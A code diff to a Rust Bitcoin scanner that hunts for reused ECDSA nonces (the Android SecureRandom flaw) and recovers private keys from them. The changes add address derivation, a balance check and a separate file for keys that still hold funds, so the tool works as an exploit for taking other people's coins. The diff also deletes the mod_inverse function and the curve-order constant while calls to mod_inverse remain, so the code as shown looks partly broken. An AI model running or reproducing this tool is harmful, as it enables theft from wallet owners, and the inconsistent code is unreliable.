@@ -1,4 +1,5 @@
 use anyhow::{anyhow, Result};
+use tracing::{info, warn, error};
 use bitcoin::secp256k1::{Secp256k1, SecretKey};
 use bitcoincore_rpc::{Auth, Client, RpcApi};
 use num_bigint::BigInt;
@@ -6,11 +7,9 @@ use num_traits::{One, Zero};
 use std::collections::HashMap;
 use std::fs::OpenOptions;
 use std::io::Write;
-use num_bigint::BigInt;
-use num_traits::{Zero, One};
 
-// secp256k1 curve order
-const SECP256K1_N: &str = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";
+
+
 
 /// Extract r and s values from a DER signature
 #[allow(dead_code)]
@@ -50,34 +49,7 @@ fn parse_der_signature(sig_bytes: &[u8]) -> Option<(Vec<u8>, Vec<u8>)> {
 
 /// Modular inverse using Extended Euclidean Algorithm
 #[allow(dead_code)]
-fn mod_inverse(a: &BigInt, n: &BigInt) -> Option<BigInt> {
-    let mut t = BigInt::zero();
-    let mut new_t = BigInt::one();
-    let mut r = n.clone();
-    let mut new_r = a.clone();
-    
-    while !new_r.is_zero() {
-        let quotient = &r / &new_r;
-        
-        let temp_t = t.clone();
-        t = new_t.clone();
-        new_t = temp_t - &quotient * &new_t;
-        
-        let temp_r = r.clone();
-        r = new_r.clone();
-        new_r = temp_r - &quotient * &new_r;
-    }
-    
-    if r > BigInt::one() {
-        return None; // Not invertible
-    }
-    
-    if t < BigInt::zero() {
-        t = t + n;
-    }
-    
-    Some(t)
-}
+
 
 /// Recover private key from two signatures with the same R value
 /// Given: (r, s1, m1) and (r, s2, m2)
@@ -103,12 +75,12 @@ fn recover_private_key(
     // Calculate k = (m1 - m2) / (s1 - s2) mod n
     let m_diff = (&m1_int - &m2_int) % &n;
     let s_diff = (&s1_int - &s2_int) % &n;
-    let s_diff_inv = mod_inverse(&s_diff, &n)?;
+    let s_diff_inv = mod_inverse(&s_diff, &n).ok()?;
     let k = (&m_diff * &s_diff_inv) % &n;
     
     // Calculate private_key = (s1 * k - m1) / r mod n
     let numerator = (&s1_int * &k - &m1_int) % &n;
-    let r_inv = mod_inverse(&r_int, &n)?;
+    let r_inv = mod_inverse(&r_int, &n).ok()?;
     let private_key = (&numerator * &r_inv) % &n;
     
     // Convert to 32-byte array
@@ -364,12 +336,12 @@ pub fn run(
     start_block: u64,
     end_block: u64,
 ) -> Result<()> {
-    println!("Android SecureRandom Vulnerability Scanner");
-    println!(
+    info!("Android SecureRandom Vulnerability Scanner");
+    info!(
         "Scanning blocks {} to {} for duplicate R values...",
         start_block, end_block
     );
-    println!("Connecting to Bitcoin Core at {}...", rpc_url);
+    info!("Connecting to Bitcoin Core at {}...", rpc_url);
 
     let rpc = Client::new(
         rpc_url,
@@ -378,14 +350,14 @@ pub fn run(
 
     // Test connection
     let blockchain_info = rpc.get_blockchain_info()?;
-    println!("Connected! Current block: {}", blockchain_info.blocks);
+    info!("Connected! Current block: {}", blockchain_info.blocks);
 
     if blockchain_info.blocks < end_block {
-        println!(
-            "Warning: Requested end block {} but node only synced to {}",
+        warn!(
+            "Requested end block {} but node only synced to {}",
             end_block, blockchain_info.blocks
         );
-        println!("Will scan up to block {}", blockchain_info.blocks);
+        warn!("Will scan up to block {}", blockchain_info.blocks);
     }
 
     // Map of R value -> (txid, signature, message hash, public key)
@@ -401,16 +373,15 @@ pub fn run(
         if block_height % 100 == 0 {
             let elapsed = start_time.elapsed().as_secs_f64();
             let rate = (block_height - start_block) as f64 / elapsed;
-            print!("\rScanning block {}/{} - Rate: {:.1} blocks/sec - Txs: {} - Sigs: {} - Duplicates: {}", 
+            info!("Scanning block {}/{} - Rate: {:.1} blocks/sec - Txs: {} - Sigs: {} - Duplicates: {}", 
                 block_height, end_block, rate, transactions_scanned, signatures_extracted, duplicates_found);
-            std::io::stdout().flush().ok();
         }
 
         // Get block hash
         let block_hash = match rpc.get_block_hash(block_height) {
             Ok(hash) => hash,
             Err(e) => {
-                eprintln!("\nError getting block hash for {}: {}", block_height, e);
+                error!("Error getting block hash for {}: {}", block_height, e);
                 continue;
             }
         };
@@ -419,7 +390,7 @@ pub fn run(
         let block = match rpc.get_block(&block_hash) {
             Ok(block) => block,
             Err(e) => {
-                eprintln!("\nError getting block {}: {}", block_height, e);
+                error!("Error getting block {}: {}", block_height, e);
                 continue;
             }
         };
@@ -473,11 +444,11 @@ pub fn run(
                                     // If this is a duplicate R value, we found a vulnerability!
                                     if !entry.is_empty() {
                                         duplicates_found += 1;
-                                        println!("\n🎯 DUPLICATE R VALUE FOUND!");
-                                        println!("R value: {}", hex::encode(&r_value));
-                                        println!("First seen in: {}", entry[0].0);
-                                        println!("Also seen in: {}", txid);
-                                        println!("Block: {}", block_height);
+                                        warn!("🎯 DUPLICATE R VALUE FOUND!");
+                                        warn!("R value: {}", hex::encode(&r_value));
+                                        warn!("First seen in: {}", entry[0].0);
+                                        warn!("Also seen in: {}", txid);
+                                        warn!("Block: {}", block_height);
 
                                         // Attempt private key recovery
                                         match attempt_key_recovery(
@@ -488,8 +459,8 @@ pub fn run(
                                             &message_hash,
                                         ) {
                                             Ok(private_key) => {
-                                                println!("✅ PRIVATE KEY RECOVERED!");
-                                                println!(
+                                                warn!("✅ PRIVATE KEY RECOVERED!");
+                                                warn!(
                                                     "Private Key (hex): {}",
                                                     hex::encode(private_key.secret_bytes())
                                                 );
@@ -501,10 +472,30 @@ pub fn run(
                                                         &secp,
                                                         &private_key,
                                                     );
-                                                println!(
+                                                warn!(
                                                     "Derived Public Key: {}",
                                                     hex::encode(public_key.serialize())
                                                 );
+
+                                                // Derive Bitcoin address from public key
+                                                use bitcoin::{Address, Network};
+                                                let compressed_pubkey = bitcoin::CompressedPublicKey(public_key);
+                                                let address = Address::p2pkh(compressed_pubkey, Network::Bitcoin);
+                                                warn!("Derived Address: {}", address);
+
+                                                // Check balance via RPC
+                                                let balance_result = rpc.get_received_by_address(&address, Some(0));
+                                                let balance = match balance_result {
+                                                    Ok(amount) => {
+                                                        let btc_amount = amount.to_btc();
+                                                        warn!("💰 Balance: {} BTC", btc_amount);
+                                                        btc_amount
+                                                    }
+                                                    Err(e) => {
+                                                        warn!("⚠️  Failed to check balance: {}", e);
+                                                        0.0
+                                                    }
+                                                };
 
                                                 // Write recovery results to file (append mode)
                                                 let recovery_data = format!(
@@ -514,29 +505,41 @@ pub fn run(
                                                      Tx2: {}\n\
                                                      Block: {}\n\
                                                      Private Key: {}\n\
-                                                     Public Key: {}\n\n",
+                                                     Public Key: {}\n\
+                                                     Address: {}\n\
+                                                     Balance: {} BTC\n\n",
                                                     hex::encode(&r_value),
                                                     entry[0].0,
                                                     txid,
                                                     block_height,
                                                     hex::encode(private_key.secret_bytes()),
-                                                    hex::encode(public_key.serialize())
+                                                    hex::encode(public_key.serialize()),
+                                                    address,
+                                                    balance
                                                 );
+
+                                                let filename = if balance > 0.0 {
+                                                    "android_securerandom_FUNDED_keys.txt"
+                                                } else {
+                                                    "android_securerandom_recovered_keys.txt"
+                                                };
 
                                                 let mut file = OpenOptions::new()
                                                     .create(true)
                                                     .append(true)
-                                                    .open(
-                                                        "android_securerandom_recovered_keys.txt",
-                                                    )?;
+                                                    .open(filename)?;
                                                 file.write_all(recovery_data.as_bytes())?;
+
+                                                if balance > 0.0 {
+                                                    warn!("🎯 FUNDED ADDRESS FOUND! Saved to android_securerandom_FUNDED_keys.txt");
+                                                }
                                             }
                                             Err(e) => {
-                                                println!(
+                                                warn!(
                                                     "⚠️  Failed to recover private key: {}",
                                                     e
                                                 );
-                                                println!("This may be due to missing sighash data or other issues.");
+                                                warn!("This may be due to missing sighash data or other issues.");
 
                                                 // Still write the duplicate finding to file (append mode)
                                                 let error_data = format!(
@@ -572,21 +575,21 @@ pub fn run(
         }
     }
 
-    println!("\n\nScan complete!");
-    println!("Blocks scanned: {} to {}", start_block, end_block);
-    println!("Transactions scanned: {}", transactions_scanned);
-    println!("Signatures extracted: {}", signatures_extracted);
-    println!("Duplicate R values found: {}", duplicates_found);
+    info!("Scan complete!");
+    info!("Blocks scanned: {} to {}", start_block, end_block);
+    info!("Transactions scanned: {}", transactions_scanned);
+    info!("Signatures extracted: {}", signatures_extracted);
+    info!("Duplicate R values found: {}", duplicates_found);
 
     if duplicates_found > 0 {
-        println!("\n⚠️  Found {} vulnerable transactions!", duplicates_found);
-        println!("Private key recovery attempts have been made.");
-        println!(
+        warn!("Found {} vulnerable transactions!", duplicates_found);
+        warn!("Private key recovery attempts have been made.");
+        warn!(
             "Successfully recovered keys are written to android_securerandom_recovered_keys.txt"
         );
-        println!("Failed recovery attempts are written to android_securerandom_hits.txt");
-        println!("\nNote: Recovery requires access to transaction sighash data.");
-        println!("If the previous transaction is not available, recovery will fail.");
+        warn!("Failed recovery attempts are written to android_securerandom_hits.txt");
+        warn!("Note: Recovery requires access to transaction sighash data.");
+        warn!("If the previous transaction is not available, recovery will fail.");
     }
 
     Ok(())
